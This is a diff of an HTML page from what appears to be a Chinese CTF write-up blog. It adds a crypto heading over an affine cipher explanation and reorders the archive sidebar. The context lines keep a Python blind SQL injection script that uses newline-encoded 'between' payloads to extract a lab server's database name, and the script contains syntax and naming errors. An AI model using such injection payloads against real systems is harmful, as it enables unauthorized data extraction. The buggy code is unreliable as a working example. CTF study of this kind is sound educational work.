@@ -440,7 +440,7 @@ height:50vh;
 </blockquote>
 <p>解题脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">baseurl = <span class="string">'http://172.16.206.101/show.php?id=-1'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">qnswer = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">32</span>,<span class="number">-1</span>):</span><br><span class="line">			<span class="keyword">if</span> c = <span class="number">33</span>:</span><br><span class="line">				flag = <span class="number">1</span></span><br><span class="line">			payload = <span class="string">'%0aor%0a(select%0a(select%0adatabase())%0abetween%0a0x'</span>+result+hex(c)[<span class="number">2</span>:<span class="number">4</span>]+<span class="string">'%0aand%0a0x7a)'</span></span><br><span class="line">			<span class="comment"># xxx</span></span><br><span class="line">			url = baseurl + payload</span><br><span class="line">			a = requests.get(url)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'郑州烩面的价钱为10'</span> <span class="keyword">in</span> a.text:</span><br><span class="line">				answer = answer + chr(c)</span><br><span class="line">				result = result + hex(c)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">				print(result)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">print(answer)</span><br></pre></td></tr></table></figure>
-<h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。</p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。</p>
 <p><img src="\images\1544099945145.png" alt="1544099945145"></p>
 <p>加密函数：E<strong>(x) = (ax + b) (mod m)</strong>，其中 a与b互质，m是编码系统中字母的个数（通常都是26）。</p>
 <p>解密函数：<strong>D(x) = <img src="\images\gif.gif" alt="a^{-1}"> (x - b) (mod m)，</strong>其中 <img src="\images\gif.gif" alt="a^{-1}"> 是 a 在Zm群的乘法逆元。</p>
@@ -473,7 +473,7 @@ height:50vh;
             <p>原文作者：<a href="http://www.lybsec.top">kubo</a>
             <p>原文链接：<a href="http://www.lybsec.top/2018/12/07/恒11/">http://www.lybsec.top/2018/12/07/恒11/</a>
             <p>发表日期：<a href="http://www.lybsec.top/2018/12/07/恒11/">December 7th 2018, 5:16:55 pm</a>
-            <p>更新日期：<a href="http://www.lybsec.top/2018/12/07/恒11/">December 7th 2018, 5:20:21 pm</a>
+            <p>更新日期：<a href="http://www.lybsec.top/2018/12/07/恒11/">December 7th 2018, 5:22:27 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -605,7 +605,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ezsql"><span class="toc-number">1.1.</span> <span class="toc-text">ezsql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#好黑的黑名单"><span class="toc-number">1.2.</span> <span class="toc-text">好黑的黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#仿射密码"><span class="toc-number">1.3.</span> <span class="toc-text">仿射密码</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ezsql"><span class="toc-number">1.1.</span> <span class="toc-text">ezsql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#好黑的黑名单"><span class="toc-number">1.2.</span> <span class="toc-text">好黑的黑名单</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#仿射密码"><span class="toc-number">2.1.</span> <span class="toc-text">仿射密码</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -618,6 +618,28 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -978,17 +1000,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/CTF-持续更新/" >HCTF(持续更新)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/件格式（png、zip持续更新）/" >文件格式（png、zip持续更新）</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/海CTF（持续更新）/" >上海CTF（持续更新）</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/CTF-持续更新/" >HCTF(持续更新)</a>
         </li>
     
     
@@ -1023,22 +1045,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/7月月赛/" >安恒7月月赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/arvisoj-web/" >jarvisoj-web</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/ve-2018-14421-seacms漏洞/" >cve-2018-14421_seacms漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/7月月赛/" >安恒7月月赛</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2018/09/23/安恒9月月赛/" >安恒9月月赛</a>
         </li>
     
     
@@ -1053,6 +1070,11 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2018/09/23/安恒9月月赛/" >安恒9月月赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">09/20</span><a class="archive-post-title" href= "/2018/09/20/我认识/" >自我认识</a>
         </li>
     
@@ -1063,22 +1085,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/thinkphp代码审计/" >thinkphp代码审计</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/sql-bypass-1/" >sql-bypass</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/学习飘零大佬的流量分析1/" >学习飘零大佬的流量分析1</a>
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/thinkphp代码审计/" >thinkphp代码审计</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/wireshark简单过滤规则/" >wireshark简单过滤规则</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/学习飘零大佬的流量分析1/" >学习飘零大佬的流量分析1</a>
         </li>
     
     
